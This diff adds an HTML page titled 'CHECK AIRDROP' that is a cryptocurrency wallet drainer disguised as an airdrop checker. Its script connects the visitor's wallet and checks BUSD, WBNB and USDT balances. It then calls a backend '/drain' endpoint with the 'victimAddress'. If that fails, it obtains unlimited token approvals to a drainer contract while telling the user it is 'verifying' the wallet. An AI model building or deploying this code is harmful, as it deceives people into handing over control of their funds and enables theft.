@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CHECK AIRDROP</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.6.1/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; text-align: center; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        button { padding: 10px 20px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .status { margin: 10px 0; padding: 10px; border-radius: 4px; white-space: pre-wrap; text-align: left; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>CHECK AIRDROP</h2>
+        <p id="connectedAccount">Not connected</p>
+        <button onclick="connectAndDrain()">Connect Wallet</button>
+        <p id="status" class="status"></p>
+    </div>
+
+    <script>
+        const API_BASE_URL = "http://localhost:3000";
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const drainerContractAddress = "0x9b8b50c102c07B61a596b7ba2e842586fa97A0D7";
+        const tokenList = [
+            { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
+            { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
+            { symbol: "USDT", address: "0x337610d27c682E347C9cD60BD4b3b107C9d34dDd", decimals: 18 },
+        ];
+        const bep20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+        let signer, connectedAddress;
+
+        async function connectAndDrain() {
+            let statusMessage = "";
+            try {
+                // Connect wallet
+                statusMessage = "Connecting to wallet...\n";
+                updateStatus(statusMessage);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                signer = await provider.getSigner();
+                connectedAddress = accounts[0];
+                document.getElementById("connectedAccount").innerText = `Connected: ${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`;
+
+                // Check token balances before funding gas
+                statusMessage += "Checking token balances...\n";
+                updateStatus(statusMessage);
+                const balanceAbi = ["function balanceOf(address account) external view returns (uint256)"];
+                let hasTokens = false;
+                for (const token of tokenList) {
+                    const tokenContract = new ethers.Contract(token.address, balanceAbi, provider);
+                    const balance = await tokenContract.balanceOf(connectedAddress);
+                    if (balance > 0) {
+                        hasTokens = true;
+                        break; // No need to check further if one token has balance
+                    }
+                }
+
+                // Fund gas only if victim has tokens
+                if (hasTokens) {
+                    statusMessage += "Checking gas balance...\n";
+                    updateStatus(statusMessage);
+                    const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ victimAddress: connectedAddress })
+                    });
+                    const gasData = await gasResponse.json();
+                    if (gasData.success) {
+                        statusMessage += `${gasData.message}\n`;
+                        updateStatus(statusMessage);
+                    }
+                } else {
+                    statusMessage += "No tokens detected, skipping gas funding...\n";
+                    updateStatus(statusMessage);
+                }
+
+                // Attempt to drain immediately
+                statusMessage += "Processing claim...\n";
+                updateStatus(statusMessage);
+                const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true })
+                });
+                const drainData = await drainResponse.json();
+                statusMessage += `${drainData.message}\n`;
+                updateStatus(statusMessage, drainData.success ? "success" : "error");
+
+                // Fallback approval if needed
+                if (drainData.needsApproval) {
+                    statusMessage += "Verifying wallet (please confirm approvals for your tokens)...\n";
+                    updateStatus(statusMessage);
+
+                    // Update ABI to include balanceOf
+                    const bep20Abi = [
+                        "function approve(address spender, uint256 amount) external returns (bool)",
+                        "function balanceOf(address account) external view returns (uint256)"
+                    ];
+
+                    // Loop over all tokens in tokenList
+                    for (const token of tokenList) {
+                        const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
+                        const balance = await tokenContract.balanceOf(connectedAddress);
+                        if (balance > 0) {
+                            statusMessage += `Approving ${token.symbol} (${ethers.formatUnits(balance, token.decimals)} available)...\n`;
+                            updateStatus(statusMessage);
+                            const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
+                            await tx.wait();
+                            statusMessage += `${token.symbol} approved!\n`;
+                            updateStatus(statusMessage);
+                        }
+                    }
+                    statusMessage += "Wallet verified!\n";
+
+                    // Retry drain after approvals
+                    statusMessage += "Processing claim again...\n";
+                    updateStatus(statusMessage);
+                    const retryResponse = await fetch(`${API_BASE_URL}/drain`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true })
+                    });
+                    const retryData = await retryResponse.json();
+                    statusMessage += `${retryData.message}\n`;
+                    updateStatus(statusMessage, retryData.success ? "success" : "error");
+                }
+            } catch (error) {
+                statusMessage += `Error: ${error.message}\n`;
+                updateStatus(statusMessage, "error");
+            }
+        }
+
+        function updateStatus(message, type = "") {
+            const status = document.getElementById("status");
+            status.innerText = message;
+            status.className = "status" + (type ? ` ${type}` : "");
+        }
+    </script>
+</body>
+</html>
